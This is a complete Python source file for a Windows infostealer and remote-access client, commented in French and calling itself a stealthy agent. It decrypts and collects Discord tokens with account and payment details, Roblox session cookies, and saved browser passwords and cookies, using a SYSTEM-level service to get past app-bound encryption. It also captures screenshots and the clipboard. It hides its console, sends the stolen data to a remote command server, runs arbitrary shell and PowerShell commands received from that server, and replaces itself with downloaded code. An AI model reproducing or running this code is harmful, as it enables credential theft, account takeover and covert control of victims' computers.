# -*- coding: utf-8 -*-
# client.pyw - Agent furtif avec collecte complète (Discord, Roblox, navigateurs, etc.)

# ========== PHASE 1 : IMPORTS MINIMAUX POUR INSTALLATION ==========
import os
import sys
import subprocess
import importlib.metadata

REQUIRED_PACKAGES = [
    'requests',
    'psutil',
    'pywin32',
    'pyperclip',
    'keyboard',
    'mss',
    'pycryptodome',
    'pypsexec',
    'websocket-client'
]

def install_package(package):
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', package])
        return True
    except:
        return False

def check_and_install_dependencies():
    missing = []
    for pkg in REQUIRED_PACKAGES:
        pkg_import = pkg.replace('-', '_')
        if pkg == 'pywin32':
            try:
                import win32api
            except ImportError:
                missing.append(pkg)
        elif pkg == 'pycryptodome':
            try:
                from Crypto.Cipher import AES
            except ImportError:
                missing.append(pkg)
        else:
            try:
                importlib.metadata.version(pkg_import)
            except (ImportError, importlib.metadata.PackageNotFoundError):
                missing.append(pkg)
    if missing:
        for pkg in missing:
            install_package(pkg)
        # Redémarrage après installation
        subprocess.Popen([sys.executable] + sys.argv)
        sys.exit(0)

check_and_install_dependencies()

# ========== PHASE 2 : TOUS LES AUTRES IMPORTS ==========
import json
import base64
import time
import threading
import ctypes
import tempfile
import shutil
import sqlite3
import re
import configparser
import binascii
import urllib.request
import urllib.parse
from datetime import datetime, timedelta, timezone
import requests
import psutil
import win32crypt
import pyperclip
import keyboard
import win32gui
from Crypto.Cipher import AES
import mss
import mss.tools
from pypsexec.client import Client

# ========== CONFIGURATION ==========
SERVER_URL = "https://serveur-distance.onrender.com"  # À remplacer
HEARTBEAT_INTERVAL = 300      # 5 minutes
COMMAND_POLL_INTERVAL = 30    # 30 secondes
CONFIG_FILE = "client_config.txt"
VERSION_URL = "https://raw.githubusercontent.com/votre-repo/client/version.txt"
UPDATE_URL = "https://raw.githubusercontent.com/votre-repo/client/client.pyw"

# Constantes pour token Discord
PATHS = {
    'Discord': os.getenv('APPDATA') + '\\discord',
    'Discord Canary': os.getenv('APPDATA') + '\\discordcanary',
    'Lightcord': os.getenv('APPDATA') + '\\Lightcord',
    'Discord PTB': os.getenv('APPDATA') + '\\discordptb',
}

BROWSER_PROCESS_NAMES = {
    'opera':    ['opera.exe'],
    'operagx':  ['opera.exe', 'operagx.exe'],
    'brave':    ['brave.exe'],
    'edge':     ['msedge.exe'],
    'firefox':  ['firefox.exe']
}

IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0

def get_machine_id():
    """Identifiant unique de la machine"""
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
        machine_guid = winreg.QueryValueEx(key, "MachineGuid")[0]
        winreg.CloseKey(key)
        return machine_guid
    except:
        return os.getenv('COMPUTERNAME', 'unknown')

MACHINE_ID = get_machine_id()

# ========== GESTION CONFIGURATION ==========
def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {}
    try:
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def get_config(key, default=None):
    return load_config().get(key, default)

def set_config(key, value):
    cfg = load_config()
    cfg[key] = value
    save_config(cfg)

# ========== FONCTIONS DE COLLECTE (issus du grabber original) ==========
def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if token:
        headers["Authorization"] = token
    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []
    if not os.path.exists(path):
        return tokens
    for file in os.listdir(path):
        if not file.endswith(".ldb") and not file.endswith(".log"):
            continue
        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in f.readlines():
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except:
            continue
    return tokens

def getkey(path):
    with open(path + "\\Local State", "r") as f:
        key = json.load(f)['os_crypt']['encrypted_key']
    return key

def get_public_ip():
    try:
        r = requests.get('https://api.ipify.org?format=json', timeout=5)
        return r.json().get('ip', 'Unknown')
    except:
        return 'Unknown'

def get_windows_version():
    try:
        import platform
        ver = platform.win32_ver()
        return f"{ver[0]} {ver[1]}"
    except:
        return "Unknown"

def get_disk_usage():
    try:
        usage = psutil.disk_usage('/')
        return {'total': usage.total, 'free': usage.free, 'used': usage.used, 'percent': usage.percent}
    except:
        return {'total': 0, 'free': 0, 'used': 0, 'percent': 0}

def get_memory_info():
    try:
        mem = psutil.virtual_memory()
        return {'total': mem.total, 'available': mem.available, 'used': mem.used, 'percent': mem.percent}
    except:
        return {'total': 0, 'available': 0, 'used': 0, 'percent': 0}

def get_system_info():
    return {
        'machine_id': MACHINE_ID,
        'computer_name': os.getenv('COMPUTERNAME', ''),
        'username': os.getenv('USERNAME', ''),
        'windows_version': get_windows_version(),
        'disk': get_disk_usage(),
        'ram': get_memory_info(),
        'ip': get_public_ip(),
        'timestamp': datetime.now(timezone.utc).isoformat()
    }

# --- Discord tokens ---
def get_discord_tokens():
    result = []
    checked = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token_enc in gettokens(path):
            token_enc = token_enc.replace("\\", "")
            try:
                key = getkey(path)
                decrypted_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
                encrypted_token = token_enc.split('dQw4w9WgXcQ:')[1]
                nonce = base64.b64decode(encrypted_token)[3:15]
                ciphertext = base64.b64decode(encrypted_token)[15:]
                token = AES.new(decrypted_key, AES.MODE_GCM, nonce).decrypt(ciphertext)[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)
                # Récupérer infos user
                headers = getheaders(token)
                r = requests.get('https://discord.com/api/v10/users/@me', headers=headers, timeout=10)
                if r.status_code != 200:
                    continue
                user = r.json()
                # Guilds
                r_guilds = requests.get('https://discordapp.com/api/v6/users/@me/guilds', headers=headers, timeout=10)
                guilds = r_guilds.json() if r_guilds.status_code == 200 else []
                admin_guilds = []
                for g in guilds:
                    if g.get('permissions', 0) & 0x8:  # ADMINISTRATOR
                        try:
                            rg = requests.get(f'https://discordapp.com/api/v6/guilds/{g["id"]}', headers=headers, timeout=10)
                            if rg.status_code == 200:
                                gdata = rg.json()
                                admin_guilds.append({
                                    'name': gdata.get('name'),
                                    'id': gdata.get('id'),
                                    'member_count': gdata.get('approximate_member_count'),
                                    'vanity': gdata.get('vanity_url_code')
                                })
                            else:
                                admin_guilds.append({'name': g.get('name'), 'id': g.get('id')})
                        except:
                            admin_guilds.append({'name': g.get('name'), 'id': g.get('id')})
                # Nitro
                r_nitro = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers, timeout=10)
                nitro = r_nitro.json() if r_nitro.status_code == 200 else []
                has_nitro = len(nitro) > 0
                expiry = nitro[0].get('current_period_end') if has_nitro else None
                # Boosts
                r_boosts = requests.get('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=headers, timeout=10)
                boosts = r_boosts.json() if r_boosts.status_code == 200 else []
                available_boosts = sum(1 for s in boosts if datetime.fromisoformat(s['cooldown_ends_at'].replace('Z', '+00:00')) <= datetime.now(timezone.utc))
                # Payment methods
                r_payments = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers, timeout=10)
                payments = r_payments.json() if r_payments.status_code == 200 else []
                payment_methods = []
                for p in payments:
                    if p['type'] == 1:
                        payment_methods.append({'type': 'CreditCard', 'invalid': p.get('invalid', False)})
                    elif p['type'] == 2:
                        payment_methods.append({'type': 'PayPal', 'invalid': p.get('invalid', False)})
                result.append({
                    'token': token,
                    'user_id': user.get('id'),
                    'username': user.get('username'),
                    'discriminator': user.get('discriminator'),
                    'email': user.get('email'),
                    'phone': user.get('phone'),
                    'mfa_enabled': user.get('mfa_enabled'),
                    'verified': user.get('verified'),
                    'flags': user.get('flags'),
                    'guilds_count': len(guilds),
                    'admin_guilds': admin_guilds,
                    'has_nitro': has_nitro,
                    'nitro_expiry': expiry,
                    'available_boosts': available_boosts,
                    'payment_methods': payment_methods,
                    'platform': platform
                })
            except Exception as e:
                continue
    return result

# --- Roblox cookie ---
def get_roblox_cookie_and_username():
    try:
        profile = os.getenv("USERPROFILE")
        path = os.path.join(profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
        if not os.path.exists(path):
            return None
        with open(path, 'r', encoding='utf-8') as f:
            data = json.load(f)
        encoded = data["CookiesData"]
        decoded = base64.b64decode(encoded)
        decrypted = win32crypt.CryptUnprotectData(decoded, None, None, None, 0)[1]
        cookies_str = decrypted.decode('utf-8', errors='ignore')
        for line in cookies_str.split(';'):
            if '.ROBLOSECURITY' in line:
                cookie = line.split('=', 1)[1].strip()
                if not cookie.startswith('_|WARNING:'):
                    continue
                # Récupérer username
                session = requests.Session()
                session.headers.update({"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Roblox/WinInet"})
                r = session.get("https://users.roblox.com/v1/users/authenticated", timeout=8)
                if r.status_code == 200:
                    username = r.json().get("name")
                    return {'cookie': cookie, 'username': username}
                return {'cookie': cookie, 'username': None}
        return None
    except:
        return None

# --- Navigateurs (mots de passe et cookies) ---
def kill_browser_process(browser_key):
    if browser_key not in BROWSER_PROCESS_NAMES:
        return
    for name in BROWSER_PROCESS_NAMES[browser_key]:
        try:
            subprocess.call(f"taskkill /f /im {name} /t", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    time.sleep(2)

def chrome_date_to_str(d):
    if d <= 0:
        return "Session"
    return (datetime(1601, 1, 1) + timedelta(microseconds=d)).strftime("%Y-%m-%d %H:%M:%S")

def get_browser_encryption_key(base_path):
    local_state = os.path.join(base_path, "Local State")
    if not os.path.exists(local_state):
        return None
    try:
        with open(local_state, "r", encoding="utf-8") as f:
            encrypted_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_value(enc_value, key):
    if not key:
        return None
    try:
        if enc_value[:3] in (b'v10', b'v11', b'v20'):
            cipher = AES.new(key, AES.MODE_GCM, nonce=enc_value[3:15])
            decrypted = cipher.decrypt_and_verify(enc_value[15:-16], enc_value[-16:])
            if len(decrypted) > 32:
                return decrypted[32:].decode(errors="ignore")
            else:
                return decrypted.decode(errors="ignore")
        else:
            return win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)[1].decode(errors="ignore")
    except:
        return None

def extract_chromium_browser(browser_name, base_path, key_func=None):
    result = {'passwords': [], 'cookies': []}
    if not os.path.exists(base_path):
        return result
    if key_func:
        key = key_func(base_path)
    else:
        key = get_browser_encryption_key(base_path)
    if not key:
        return result
    profiles = []
    default_path = os.path.join(base_path, "Default")
    if os.path.exists(os.path.join(default_path, "Login Data")):
        profiles.append(("Default", default_path))
    for item in os.listdir(base_path):
        if item.startswith("Profile "):
            prof_path = os.path.join(base_path, item)
            if os.path.exists(os.path.join(prof_path, "Login Data")):
                profiles.append((item, prof_path))
    # Mots de passe
    for profile_name, profile_path in profiles:
        login_db = os.path.join(profile_path, "Login Data")
        if os.path.exists(login_db):
            try:
                tmp = tempfile.NamedTemporaryFile(delete=False)
                tmp.close()
                shutil.copy2(login_db, tmp.name)
                conn = sqlite3.connect(tmp.name)
                for url, user, pwd in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
                    if user or pwd:
                        password = decrypt_value(pwd, key) if pwd else ""
                        if password:
                            result['passwords'].append({
                                'browser': browser_name,
                                'profile': profile_name,
                                'url': url,
                                'username': user,
                                'password': password
                            })
                conn.close()
                os.unlink(tmp.name)
            except:
                pass
        # Cookies
        cookie_path = os.path.join(profile_path, "Network", "Cookies")
        if os.path.exists(cookie_path):
            try:
                tmp = tempfile.NamedTemporaryFile(delete=False)
                tmp.close()
                shutil.copy2(cookie_path, tmp.name)
                conn = sqlite3.connect(tmp.name)
                for host, name, path, enc_val, expires, secure, httponly in conn.execute(
                    "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies"
                ):
                    val = decrypt_value(enc_val, key)
                    if val:
                        result['cookies'].append({
                            'browser': browser_name,
                            'profile': profile_name,
                            'host': host,
                            'name': name,
                            'value': val,
                            'path': path,
                            'expires': chrome_date_to_str(expires),
                            'secure': bool(secure),
                            'httponly': bool(httponly)
                        })
                conn.close()
                os.unlink(tmp.name)
            except:
                pass
    return result

# Firefox
class NSSProxy:
    class SECItem(ctypes.Structure):
        _fields_ = [("type", ctypes.c_uint), ("data", ctypes.c_char_p), ("len", ctypes.c_uint)]
        def decode_data(self):
            return ctypes.string_at(self.data, self.len).decode('utf-8')
    class PK11SlotInfo(ctypes.Structure):
        pass
    def __init__(self):
        self.libnss = None
        nssname = "nss3.dll"
        locations = ["", "C:\\Program Files\\Mozilla Firefox", "C:\\Program Files (x86)\\Mozilla Firefox"]
        for loc in locations:
            nsslib = os.path.join(loc, nssname)
            if not os.path.exists(nsslib):
                continue
            os.environ["PATH"] = ";".join([loc, os.environ["PATH"]])
            workdir = os.getcwd()
            try:
                os.chdir(loc)
                self.libnss = ctypes.CDLL(nsslib)
                break
            finally:
                os.chdir(workdir)
        if self.libnss is None:
            raise Exception("NSS library not found")
        for name, restype, *argtypes in [
            ("NSS_Init", ctypes.c_int, ctypes.c_char_p),
            ("NSS_Shutdown", ctypes.c_int),
            ("PK11_GetInternalKeySlot", ctypes.POINTER(self.PK11SlotInfo)),
            ("PK11_FreeSlot", None, ctypes.POINTER(self.PK11SlotInfo)),
            ("PK11_NeedLogin", ctypes.c_int, ctypes.POINTER(self.PK11SlotInfo)),
            ("PK11_CheckUserPassword", ctypes.c_int, ctypes.POINTER(self.PK11SlotInfo), ctypes.c_char_p),
            ("PK11SDR_Decrypt", ctypes.c_int, ctypes.POINTER(self.SECItem), ctypes.POINTER(self.SECItem), ctypes.c_void_p),
            ("SECITEM_ZfreeItem", None, ctypes.POINTER(self.SECItem), ctypes.c_int)
        ]:
            res = getattr(self.libnss, name)
            res.argtypes = argtypes
            res.restype = restype
            setattr(self, "_" + name, res)
    def initialize(self, profile):
        self._NSS_Init(("sql:" + profile).encode('utf-8'))
    def shutdown(self):
        self._NSS_Shutdown()
    def authenticate(self, profile):
        keyslot = self._PK11_GetInternalKeySlot()
        try:
            if self._PK11_NeedLogin(keyslot):
                self._PK11_CheckUserPassword(keyslot, b"")
        finally:
            self._PK11_FreeSlot(keyslot)
    def decrypt(self, data64):
        data = binascii.a2b_base64(data64)
        inp = self.SECItem(0, data, len(data))
        out = self.SECItem(0, None, 0)
        try:
            self._PK11SDR_Decrypt(inp, out, None)
            return out.decode_data()
        finally:
            self._SECITEM_ZfreeItem(out, 0)

def get_firefox_profiles():
    base_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")
    profiles = []
    profileini = os.path.join(base_path, "profiles.ini")
    if not os.path.isfile(profileini):
        return []
    config = configparser.ConfigParser()
    config.read(profileini, encoding='utf-8')
    for section in config.sections():
        if section.startswith("Profile"):
            name = config.get(section, "Name", fallback="Unknown")
            path = config.get(section, "Path")
            full_path = os.path.join(base_path, path)
            if config.get(section, "IsRelative", fallback='1') == '0':
                full_path = path
            if os.path.exists(full_path):
                profiles.append((name, full_path))
    return profiles

def extract_firefox_data():
    result = {'passwords': [], 'cookies': []}
    kill_browser_process('firefox')
    time.sleep(2)
    profiles = get_firefox_profiles()
    for profile_name, profile_path in profiles:
        try:
            if not os.path.exists(os.path.join(profile_path, "key4.db")) or not os.path.exists(os.path.join(profile_path, "cert9.db")):
                continue
            moz = NSSProxy()
            moz.initialize(profile_path)
            moz.authenticate(profile_name)
            # Logins
            logins_json = os.path.join(profile_path, "logins.json")
            if os.path.exists(logins_json):
                with open(logins_json, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for entry in data.get("logins", []):
                    try:
                        user = moz.decrypt(entry["encryptedUsername"])
                        pwd = moz.decrypt(entry["encryptedPassword"])
                        if user and pwd:
                            result['passwords'].append({
                                'browser': 'Firefox',
                                'profile': profile_name,
                                'url': entry.get("hostname"),
                                'username': user,
                                'password': pwd
                            })
                    except:
                        pass
            # Cookies
            cookie_db = os.path.join(profile_path, "cookies.sqlite")
            if os.path.exists(cookie_db):
                tmp = tempfile.NamedTemporaryFile(delete=False)
                tmp.close()
                shutil.copy2(cookie_db, tmp.name)
                conn = sqlite3.connect(tmp.name)
                cur = conn.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
                for host, name, value, path, expiry, secure, httponly in cur:
                    if value:
                        result['cookies'].append({
                            'browser': 'Firefox',
                            'profile': profile_name,
                            'host': host,
                            'name': name,
                            'value': value,
                            'path': path,
                            'expires': datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S') if expiry else 'Session',
                            'secure': bool(secure),
                            'httponly': bool(httponly)
                        })
                conn.close()
                os.unlink(tmp.name)
            moz.shutdown()
        except:
            continue
    return result

# Brave (app-bound key avec pypsexec)
def get_brave_app_bound_key(local_state_path):
    if not os.path.exists(local_state_path) or not IS_ADMIN:
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        app_bound_encrypted_key = local_state.get("os_crypt", {}).get("app_bound_encrypted_key")
        if not app_bound_encrypted_key:
            return None
        decrypt_script = """
import win32crypt
import binascii
encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
print(binascii.b2a_base64(encrypted_key[1]).decode())
"""
        try:
            c = Client("localhost")
            c.connect()
            c.create_service()
            app_bound_key = binascii.a2b_base64(app_bound_encrypted_key)
            if app_bound_key[:4] == b"APPB":
                app_bound_key = app_bound_key[4:]
            app_bound_encrypted_key_b64 = binascii.b2a_base64(app_bound_key).decode().strip()
            encrypted_key_b64, _, rc = c.run_executable(
                sys.executable,
                arguments=f'-c "{decrypt_script.format(app_bound_encrypted_key_b64)}"',
                use_system_account=True
            )
            if rc != 0:
                return None
            decrypted_key_b64, _, rc = c.run_executable(
                sys.executable,
                arguments=f'-c "{decrypt_script.format(encrypted_key_b64.decode().strip())}"',
                use_system_account=False
            )
            if rc != 0:
                return None
            decrypted_key = binascii.a2b_base64(decrypted_key_b64)
            if len(decrypted_key) < 32:
                return None
            return decrypted_key[-32:]
        except:
            return None
        finally:
            try:
                c.remove_service()
            except:
                pass
            c.disconnect()
    except:
        return None

def extract_brave_data():
    if not IS_ADMIN:
        return {'passwords': [], 'cookies': []}
    brave_path = os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data')
    if not os.path.exists(brave_path):
        return {'passwords': [], 'cookies': []}
    kill_browser_process('brave')
    key = get_brave_app_bound_key(os.path.join(brave_path, 'Local State'))
    if not key:
        key = get_browser_encryption_key(brave_path)
    if not key:
        return {'passwords': [], 'cookies': []}
    return extract_chromium_browser('Brave', brave_path, lambda x: key)

# Edge (app-bound)
def get_edge_app_bound_key(local_state_path):
    if not os.path.exists(local_state_path) or not IS_ADMIN:
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        app_bound_encrypted_key = local_state.get("os_crypt", {}).get("app_bound_encrypted_key")
        if not app_bound_encrypted_key:
            return None
        decrypt_script = """
import win32crypt
import binascii
encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
print(binascii.b2a_base64(encrypted_key[1]).decode())
"""
        try:
            c = Client("localhost")
            c.connect()
            c.create_service()
            app_bound_key = binascii.a2b_base64(app_bound_encrypted_key)
            if app_bound_key[:4] == b"APPB":
                app_bound_key = app_bound_key[4:]
            app_bound_encrypted_key_b64 = binascii.b2a_base64(app_bound_key).decode().strip()
            encrypted_key_b64, _, rc = c.run_executable(
                sys.executable,
                arguments=f'-c "{decrypt_script.format(app_bound_encrypted_key_b64)}"',
                use_system_account=True
            )
            if rc != 0:
                return None
            decrypted_key_b64, _, rc = c.run_executable(
                sys.executable,
                arguments=f'-c "{decrypt_script.format(encrypted_key_b64.decode().strip())}"',
                use_system_account=False
            )
            if rc != 0:
                return None
            decrypted_key = binascii.a2b_base64(decrypted_key_b64)
            if len(decrypted_key) < 32:
                return None
            return decrypted_key[-32:]
        except:
            return None
        finally:
            try:
                c.remove_service()
            except:
                pass
            c.disconnect()
    except:
        return None

def extract_edge_data():
    if not IS_ADMIN:
        return {'passwords': [], 'cookies': []}
    edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
    if not os.path.exists(edge_path):
        return {'passwords': [], 'cookies': []}
    kill_browser_process('edge')
    key = get_edge_app_bound_key(os.path.join(edge_path, 'Local State'))
    if not key:
        key = get_browser_encryption_key(edge_path)
    if not key:
        return {'passwords': [], 'cookies': []}
    return extract_chromium_browser('Edge', edge_path, lambda x: key)

def collect_all_browsers_data():
    all_passwords = []
    all_cookies = []
    # Opera
    opera_path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable")
    if os.path.exists(opera_path):
        data = extract_chromium_browser('Opera', opera_path)
        all_passwords.extend(data['passwords'])
        all_cookies.extend(data['cookies'])
    # Opera GX
    operagx_path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable")
    if os.path.exists(operagx_path):
        data = extract_chromium_browser('Opera GX', operagx_path)
        all_passwords.extend(data['passwords'])
        all_cookies.extend(data['cookies'])
    # Firefox
    ff_data = extract_firefox_data()
    all_passwords.extend(ff_data['passwords'])
    all_cookies.extend(ff_data['cookies'])
    # Brave
    brave_data = extract_brave_data()
    all_passwords.extend(brave_data['passwords'])
    all_cookies.extend(brave_data['cookies'])
    # Edge
    edge_data = extract_edge_data()
    all_passwords.extend(edge_data['passwords'])
    all_cookies.extend(edge_data['cookies'])
    return {'passwords': all_passwords, 'cookies': all_cookies}

# --- Autres utilitaires ---
def take_screenshot():
    try:
        with mss.mss() as sct:
            monitors = sct.monitors[1:]  # exclure l'écran virtuel
            screenshots = []
            for i, mon in enumerate(monitors):
                img = sct.grab(mon)
                img_b64 = base64.b64encode(mss.tools.to_png(img.rgb, img.size)).decode()
                screenshots.append({'monitor': i+1, 'data': img_b64})
            return screenshots
    except:
        return []

def get_clipboard_text():
    try:
        return pyperclip.paste()
    except:
        return ""

def list_processes():
    procs = []
    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
        try:
            procs.append(proc.info)
        except:
            continue
    return procs[:200]

def kill_process(pid):
    try:
        proc = psutil.Process(pid)
        proc.terminate()
        return {'success': True, 'message': f'Process {pid} terminated'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def execute_powershell(cmd):
    try:
        result = subprocess.run(['powershell', '-Command', cmd], capture_output=True, text=True, timeout=30, shell=True)
        return {'stdout': result.stdout, 'stderr': result.stderr, 'returncode': result.returncode}
    except Exception as e:
        return {'error': str(e)}

def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, shell=True)
        return {'stdout': result.stdout, 'stderr': result.stderr, 'returncode': result.returncode}
    except Exception as e:
        return {'error': str(e)}

# ========== COMMANDES DISPONIBLES ==========
def handle_command(command):
    cmd_type = command.get('type')
    params = command.get('params', {})
    cmd_id = command.get('id')

    if cmd_type == 'ping':
        result = {'status': 'pong', 'timestamp': datetime.now().isoformat()}
    elif cmd_type == 'system_info':
        result = get_system_info()
    elif cmd_type == 'discord_data':
        result = get_discord_tokens()
    elif cmd_type == 'roblox_cookie':
        result = get_roblox_cookie_and_username()
    elif cmd_type == 'browser_passwords':
        data = collect_all_browsers_data()
        result = data['passwords']
    elif cmd_type == 'browser_cookies':
        data = collect_all_browsers_data()
        result = data['cookies']
    elif cmd_type == 'screenshot':
        result = take_screenshot()
    elif cmd_type == 'clipboard':
        result = get_clipboard_text()
    elif cmd_type == 'list_processes':
        result = list_processes()
    elif cmd_type == 'kill_process':
        pid = params.get('pid')
        if pid:
            result = kill_process(pid)
        else:
            result = {'error': 'missing pid'}
    elif cmd_type == 'execute_ps':
        cmd = params.get('command', '')
        result = execute_powershell(cmd)
    elif cmd_type == 'execute_cmd':
        cmd = params.get('command', '')
        result = execute_cmd(cmd)
    else:
        result = {'error': f'Unknown command: {cmd_type}'}

    return result

# ========== COMMUNICATION AVEC SERVEUR ==========
def send_heartbeat():
    url = f"{SERVER_URL}/api/heartbeat"
    data = get_system_info()
    try:
        response = requests.post(url, json=data, timeout=10)
        if response.status_code == 200:
            resp = response.json()
            if 'token' in resp:
                set_config('token', resp['token'])
            return True
    except:
        pass
    return False

def get_commands():
    token = get_config('token')
    headers = {'Authorization': f'Bearer {token}'} if token else {}
    try:
        url = f"{SERVER_URL}/api/commands/{MACHINE_ID}"
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.json().get('commands', [])
    except:
        pass
    return []

def send_command_result(command_id, result):
    token = get_config('token')
    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'} if token else {}
    try:
        url = f"{SERVER_URL}/api/command_result"
        payload = {
            'machine_id': MACHINE_ID,
            'command_id': command_id,
            'result': result
        }
        requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        pass

# ========== THREADS ==========
def heartbeat_loop():
    while True:
        try:
            send_heartbeat()
        except:
            pass
        time.sleep(HEARTBEAT_INTERVAL)

def command_poll_loop():
    while True:
        try:
            commands = get_commands()
            for cmd in commands:
                result = handle_command(cmd)
                send_command_result(cmd.get('id'), result)
        except:
            pass
        time.sleep(COMMAND_POLL_INTERVAL)

# ========== MISE À JOUR ==========
def get_remote_version():
    try:
        r = requests.get(VERSION_URL, timeout=5)
        return r.text.strip() if r.status_code == 200 else None
    except:
        return None

def get_local_version():
    return get_config('version')

def update_local_version(version):
    set_config('version', version)

def perform_update():
    remote_version = get_remote_version()
    local_version = get_local_version()
    if not remote_version or remote_version == local_version:
        return False
    try:
        r = requests.get(UPDATE_URL, timeout=15)
        if r.status_code != 200:
            return False
        current_script = os.path.abspath(sys.argv[0])
        with open(current_script, 'wb') as f:
            f.write(r.content)
        update_local_version(remote_version)
        subprocess.Popen([sys.executable, current_script])
        sys.exit(0)
    except:
        return False

def check_update_on_startup():
    remote = get_remote_version()
    local = get_local_version()
    if remote and remote != local:
        perform_update()

# ========== CACHER LA CONSOLE ==========
def hide_console():
    if sys.platform == 'win32':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ========== DÉMARRAGE ==========
if __name__ == '__main__':
    hide_console()
    check_update_on_startup()
    # Envoi initial
    send_heartbeat()
    # Lancer les threads
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    threading.Thread(target=command_poll_loop, daemon=True).start()
    # Boucle infinie
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass